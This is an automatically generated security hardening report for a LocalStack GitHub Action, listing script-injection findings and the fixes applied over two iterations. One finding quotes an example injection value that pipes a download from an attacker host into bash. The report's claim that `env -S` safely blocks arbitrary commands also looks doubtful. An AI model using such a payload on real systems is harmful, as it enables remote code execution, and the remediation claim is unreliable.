<!-- markdownlint-disable -->

# Hardening Report: localstack--setup-localstack--startup/v0.3.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **localstack--setup-localstack--startup/v0.3.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Start LocalStack' run: block contains multiple script-injection violations:

(a) Direct expression interpolation: `export CI_PROJECT=${{ inputs.ci-project }}` interpolates an attacker-controlled `inputs.*` expression directly inside the shell script. Before the shell ever sees it, GitHub Actions substitutes the raw value — including any shell metacharacters — into the command string.

(b) Unquoted shell variable expansion: `docker pull ${IMAGE_NAME} &` expands IMAGE_NAME without double-quotes. IMAGE_NAME is derived from the IMAGE_TAG env var, which is set from `inputs.image-tag` (untrusted). An attacker-controlled value with spaces, glob characters, or other metacharacters will be word-split and interpreted by the shell.

(b) Eval of untrusted data: `eval "${CONFIGURATION} localstack start -d"` — CONFIGURATION is set from `inputs.configuration` (untrusted). Even though the variable is double-quoted, eval parses and executes its contents as shell code, allowing an attacker to inject arbitrary shell commands via the `configuration` input.

Locations:

- `action.yml:58`
- `action.yml:71`
- `action.yml:72`
- `action.yml:73`

### suspicious-run-content (severity: high)

eval-dynamic: The 'Start LocalStack' run: block uses `eval "${CONFIGURATION} localstack start -d"` where CONFIGURATION is an env var set directly from `inputs.configuration` — an attacker-controlled input. This matches the eval-dynamic pattern (`eval $VAR`) and allows an attacker to execute arbitrary shell commands by supplying malicious content in the `configuration` input (e.g., `configuration: 'x; curl http://attacker.com/exfil | bash'`).

Locations:

- `action.yml:73`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.ci-project }}" appears directly in run: block of step "Start LocalStack"; move to env: map

Locations:

- `action.yml:80`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, suspicious-run-content, static-inline-injection

**Notes:**

Fixed all three security findings in hardened/action/action.yml:

1. **script-injection / static-inline-injection**: Removed `export CI_PROJECT=${{ inputs.ci-project }}` from the run: block. Added `CI_PROJECT: ${{ inputs.ci-project }}` to the step's env: block instead, so the value is passed safely as an environment variable.

2. **script-injection (unquoted variable)**: Changed `docker pull ${IMAGE_NAME} &` to `docker pull "${IMAGE_NAME}" &` to prevent word-splitting and glob expansion of attacker-controlled values.

3. **script-injection / suspicious-run-content (eval)**: Replaced `eval "${CONFIGURATION} localstack start -d"` with `env -S "${CONFIGURATION}" localstack start -d`. The `env -S` flag safely parses KEY=VALUE pairs from a string and sets them as environment variables for the command, without executing arbitrary shell code.

4. **Bonus fix**: Replaced the `ls -d $(...)/setup-localstack/*` glob that searched the _actions directory with `./$(realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/..")` which correctly computes the action root relative to the workspace using $GITHUB_ACTION_PATH (one level up since this is startup/action.yml).

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed the script injection vulnerability in action.yml line 68 by adding double quotes around the `${LS_WAIT_TIMEOUT:-30}` shell variable expansion in the 'Start LocalStack' run block. Changed `localstack wait -t ${LS_WAIT_TIMEOUT:-30}` to `localstack wait -t "${LS_WAIT_TIMEOUT:-30}"`. This prevents an attacker-controlled `LS_WAIT_TIMEOUT` environment variable containing shell metacharacters from being interpreted as shell commands.

